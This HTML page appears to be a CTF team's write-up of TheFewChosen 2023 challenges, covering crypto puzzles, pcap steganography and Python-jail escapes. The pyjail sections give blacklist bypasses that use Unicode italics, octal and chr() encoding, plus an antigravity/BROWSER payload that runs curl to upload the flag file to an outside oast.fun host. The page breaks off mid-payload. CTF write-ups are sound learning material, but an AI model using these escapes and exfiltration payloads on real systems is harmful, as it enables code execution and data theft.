<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TheFewChosen 2023" /><meta name="author" content="Protag, 12thRockYou, m0z" /><meta property="og:locale" content="en" /><meta name="description" content="Crypto Dizzy We’re given this to decipher: 1 T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24 The solution is to rearrange the characters in order and the order is determined by the number attached after it. ```python f = “T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24”.split() f [‘T4’, ‘l16’, ‘_36’, ‘510’, ‘_27’, ‘s26’, ‘_11’, ‘320’, ‘414’, ‘{6’, ‘}39’, ‘C2’, ‘T0’, ‘m28’, ‘317’, ‘y35’, ‘d31’, ‘F1’, ‘m22’, ‘g19’, ‘d38’, ‘z34’, ‘423’, ‘l15’, ‘329’, ‘c12’, ‘;37’, ‘19’, ‘h13’, ‘_30’, ‘F5’, ‘t7’, ‘C3’, ‘325’, ‘z33’, ‘_21’, ‘h8’, ‘n18’, ‘132’, ‘k24’] d = {} for x in f: d[x[1:]] = x[0]" /><meta property="og:description" content="Crypto Dizzy We’re given this to decipher: 1 T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24 The solution is to rearrange the characters in order and the order is determined by the number attached after it. ```python f = “T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24”.split() f [‘T4’, ‘l16’, ‘_36’, ‘510’, ‘_27’, ‘s26’, ‘_11’, ‘320’, ‘414’, ‘{6’, ‘}39’, ‘C2’, ‘T0’, ‘m28’, ‘317’, ‘y35’, ‘d31’, ‘F1’, ‘m22’, ‘g19’, ‘d38’, ‘z34’, ‘423’, ‘l15’, ‘329’, ‘c12’, ‘;37’, ‘19’, ‘h13’, ‘_30’, ‘F5’, ‘t7’, ‘C3’, ‘325’, ‘z33’, ‘_21’, ‘h8’, ‘n18’, ‘132’, ‘k24’] d = {} for x in f: d[x[1:]] = x[0]" /><link rel="canonical" href="https://ireland.re/posts/TheFewChosen_2023/" /><meta property="og:url" content="https://ireland.re/posts/TheFewChosen_2023/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-07-30T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TheFewChosen 2023" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@Protag, 12thRockYou, m0z" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Protag, 12thRockYou, m0z"},"dateModified":"2023-08-30T16:14:33+00:00","datePublished":"2023-07-30T00:00:00+00:00","description":"Crypto Dizzy We’re given this to decipher: 1 T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24 The solution is to rearrange the characters in order and the order is determined by the number attached after it. ```python f = “T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24”.split() f [‘T4’, ‘l16’, ‘_36’, ‘510’, ‘_27’, ‘s26’, ‘_11’, ‘320’, ‘414’, ‘{6’, ‘}39’, ‘C2’, ‘T0’, ‘m28’, ‘317’, ‘y35’, ‘d31’, ‘F1’, ‘m22’, ‘g19’, ‘d38’, ‘z34’, ‘423’, ‘l15’, ‘329’, ‘c12’, ‘;37’, ‘19’, ‘h13’, ‘_30’, ‘F5’, ‘t7’, ‘C3’, ‘325’, ‘z33’, ‘_21’, ‘h8’, ‘n18’, ‘132’, ‘k24’] d = {} for x in f: d[x[1:]] = x[0]","headline":"TheFewChosen 2023","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/TheFewChosen_2023/"},"url":"https://ireland.re/posts/TheFewChosen_2023/"}</script><title>TheFewChosen 2023 | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>TheFewChosen 2023</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TheFewChosen 2023</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1690675200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-07-30 </em> </span> <span> Updated <em class="timeago" data-ts="1693412073" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-08-30 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3038 words"> <em>16 min</em> read</span></div></div></div><div class="post-content"><h1 id="crypto">Crypto</h1><h2 id="dizzy"><span class="mr-2">Dizzy</span><a href="#dizzy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We’re given this to decipher:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24
</pre></table></code></div></div><p>The solution is to rearrange the characters in order and the order is determined by the number attached after it.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">f</span> <span class="o">=</span> <span class="s">"T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24"</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
<span class="n">f</span>
<span class="p">[</span><span class="s">'T4'</span><span class="p">,</span> <span class="s">'l16'</span><span class="p">,</span> <span class="s">'_36'</span><span class="p">,</span> <span class="s">'510'</span><span class="p">,</span> <span class="s">'_27'</span><span class="p">,</span> <span class="s">'s26'</span><span class="p">,</span> <span class="s">'_11'</span><span class="p">,</span> <span class="s">'320'</span><span class="p">,</span> <span class="s">'414'</span><span class="p">,</span> <span class="s">'{6'</span><span class="p">,</span> <span class="s">'}39'</span><span class="p">,</span> <span class="s">'C2'</span><span class="p">,</span> <span class="s">'T0'</span><span class="p">,</span> <span class="s">'m28'</span><span class="p">,</span> <span class="s">'317'</span><span class="p">,</span> <span class="s">'y35'</span><span class="p">,</span> <span class="s">'d31'</span><span class="p">,</span> <span class="s">'F1'</span><span class="p">,</span> <span class="s">'m22'</span><span class="p">,</span> <span class="s">'g19'</span><span class="p">,</span> <span class="s">'d38'</span><span class="p">,</span> <span class="s">'z34'</span><span class="p">,</span> <span class="s">'423'</span><span class="p">,</span> <span class="s">'l15'</span><span class="p">,</span> <span class="s">'329'</span><span class="p">,</span> <span class="s">'c12'</span><span class="p">,</span> <span class="s">';37'</span><span class="p">,</span> <span class="s">'19'</span><span class="p">,</span> <span class="s">'h13'</span><span class="p">,</span> <span class="s">'_30'</span><span class="p">,</span> <span class="s">'F5'</span><span class="p">,</span> <span class="s">'t7'</span><span class="p">,</span> <span class="s">'C3'</span><span class="p">,</span> <span class="s">'325'</span><span class="p">,</span> <span class="s">'z33'</span><span class="p">,</span> <span class="s">'_21'</span><span class="p">,</span> <span class="s">'h8'</span><span class="p">,</span> <span class="s">'n18'</span><span class="p">,</span> <span class="s">'132'</span><span class="p">,</span> <span class="s">'k24'</span><span class="p">]</span>
<span class="n">d</span> <span class="o">=</span> <span class="p">{}</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">d</span><span class="p">[</span><span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">:]]</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">keys</span><span class="p">())):</span>
    <span class="n">flag</span> <span class="o">+=</span> <span class="n">d</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span>

<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</pre></table></code></div></div><p>Running the script gives the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCCTF{th15_ch4ll3ng3_m4k3s_m3_d1zzy_;d}
</pre></table></code></div></div><h2 id="mayday"><span class="mr-2">MayDay!</span><a href="#mayday" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We’re given this to decipher:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven
</pre></table></code></div></div><p>Putting this into <a href="https://cryptii.com/pipes/nato-phonetic-alphabet">cryptii</a> yields:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wh4tDashAlphar3DashyouDashs1nkingDash4b0u7
</pre></table></code></div></div><p>The flag is:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCTF{WH4T-AR3-YOU-S1NKING-4B0U7}
</pre></table></code></div></div><h1 id="forensics">Forensics</h1><h2 id="some-traffic"><span class="mr-2">Some Traffic</span><a href="#some-traffic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We’re given a pcapng file to analyse. From reading the requests we can see a few HTTP POST requests containing image files.</p><p>We can convert the pcapng to a pcap file by opening it in Wireshark and saving it. Now we can use <a href="https://www.netresec.com/?page=NetworkMiner">Network Miner</a> to extract the image files that are being uploaded in it. <img data-src="/images/thefewchosen/network_miner.png" alt="network miner" data-proofer-ignore></p><p>The flag can be extracted by running zsteg on the third image (output_modified.png) or by uploading it to <a href="https://aperisolve.com">AperiSolve</a>. In this case however AperiSolve was inconsistent in showing the full ztego output with the flag.</p><p>Flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCCTF{H1dd3n_d4t4_1n_p1x3ls_i5n't_f4n_4nd_e4sy_to_f1nd!}
</pre></table></code></div></div><h1 id="misc">Misc</h1><h2 id="discord-shenanigans-v3"><span class="mr-2">Discord Shenanigans V3</span><a href="#discord-shenanigans-v3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The discord bot has an avatar with the flag in it, you can get it by using inspect element and downloading the discord avatar.</p><h2 id="my-first-calculator"><span class="mr-2">My First Calculator</span><a href="#my-first-calculator" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This challenge is a pyjail where we can’t use letters or full stop.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>

<span class="k">print</span><span class="p">(</span><span class="s">"This is a calculator"</span><span class="p">)</span>

<span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Formula: "</span><span class="p">)</span>

<span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">blacklist</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."</span>

<span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">x</span> <span class="ow">in</span> <span class="n">inp</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Nice try"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">()</span>

<span class="n">fns</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"pow"</span><span class="p">:</span> <span class="nb">pow</span>
<span class="p">}</span>

<span class="k">print</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">inp</span><span class="p">,</span> <span class="n">fns</span><span class="p">,</span> <span class="n">fns</span><span class="p">))</span>
</pre></table></code></div></div><p>This restriction can be bypassed by using italic characters that get normalised by python. You can use <a href="https://lingojam.com/ItalicTextGenerator">lingojam’s italic text generator</a> to do this. We used exec with the rest encoded in octal to get the flag.</p><p>Before transformation:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>exec('print(open("flag").read())')
</pre></table></code></div></div><p>After:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>𝘦𝘹𝘦𝘤('\160\162\151\156\164\050\157\160\145\156\050\042\146\154\141\147\042\051\056\162\145\141\144\050\051\051')
</pre></table></code></div></div><p>Putting this in gives us the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>TFCCTF{18641f40c9beac02ceeaf87db851c386}
</pre></table></code></div></div><h2 id="my-third-calculator"><span class="mr-2">My Third Calculator</span><a href="#my-third-calculator" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is the next pyjail challenge (there was no second calculator).</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>

<span class="k">print</span><span class="p">(</span><span class="s">"This is a safe calculator"</span><span class="p">)</span>

<span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Formula: "</span><span class="p">)</span>

<span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">blacklist</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ."</span>

<span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">x</span> <span class="ow">in</span> <span class="n">inp</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Nice try"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">()</span>

<span class="n">fns</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"__builtins__"</span><span class="p">:</span> <span class="p">{</span><span class="s">"setattr"</span><span class="p">:</span> <span class="nb">setattr</span><span class="p">,</span> <span class="s">"__import__"</span><span class="p">:</span> <span class="nb">__import__</span><span class="p">,</span> <span class="s">"chr"</span><span class="p">:</span> <span class="nb">chr</span><span class="p">}</span>
<span class="p">}</span>

<span class="k">print</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">inp</span><span class="p">,</span> <span class="n">fns</span><span class="p">,</span> <span class="n">fns</span><span class="p">))</span>
</pre></table></code></div></div><p>This time builtins are overwritten except for setattr, __import__ and chr.</p><p>We can change strings into a bunch of chr() calls using this smol script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">text_to_character_code</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"+"</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">"char(</span><span class="si">{</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="si">}</span><span class="s">)"</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">])</span>

<span class="k">print</span><span class="p">(</span><span class="n">text_to_character_code</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'input&gt;'</span><span class="p">)))</span>
</pre></table></code></div></div><p>After looking through old pyjail solutions we ended up using the antigravity payload:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">__import__</span><span class="p">(</span><span class="s">'antigravity'</span><span class="p">,</span><span class="nb">setattr</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s">'os'</span><span class="p">),</span><span class="s">'environ'</span><span class="p">,{</span><span class="s">'BROWSER'</span><span class="p">:</span><span class="s">'/bin/sh -c "curl -T flag cj2hjb3b7pnbr8g80gf0ifgcciwaz587a.oast.fun;exit" #%s'</span><span class="p">}))</span> 
</pre></table></code></div></div><p>The antigravity module is a joke module that is a reference to <a href="https://xkcd.com/353/">XKCD #353</a> and importing it opens that XKCD comic in the browser. We can overwrite the browser env variable with our shell command and that gets executed instead of the browser when it gets imported.</p><p>We transform this payload by changing all the strings into chr() calls and italicising like before:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">__𝘪𝘮𝘱𝘰𝘳𝘵__</span><span class="p">(</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">121</span><span class="p">),</span><span class="n">𝘴𝘦𝘵𝘢𝘵𝘵𝘳</span><span class="p">(</span><span class="n">__𝘪𝘮𝘱𝘰𝘳𝘵__</span><span class="p">(</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">115</span><span class="p">)),</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">110</span><span class="p">),{</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">66</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">82</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">79</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">83</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">82</span><span class="p">):</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="o">+</span><span class="n">𝘤𝘩𝘳</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="o">+</span><span 